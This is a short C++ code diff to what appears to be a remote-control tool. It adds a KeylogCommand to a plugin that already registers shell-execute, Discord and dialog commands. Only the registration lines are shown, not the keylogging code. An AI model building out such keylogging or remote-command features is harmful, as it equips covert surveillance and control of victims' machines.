@@ -7,6 +7,7 @@ PARSE_ENUM(NavigationCommandEnum);
 PARSE_ENUM(AudioCommandEnum);
 PARSE_ENUM(DiscordCommandEnum);
 PARSE_ENUM(ShowoffCommandEnum);
+PARSE_ENUM(KeylogCommandEnum);
 
 void StdPlugin::init(Controller& ctrl) {
     DEBUGLOG("[+] StdPlugin loaded.\n");
@@ -21,4 +22,5 @@ void StdPlugin::init(Controller& ctrl) {
     ctrl.register_command<DialogCommand>();
     ctrl.register_command<ShowoffCommand>();
     ctrl.register_command<ShellExecuteCommand>();
+    ctrl.register_command<KeylogCommand>();
 }
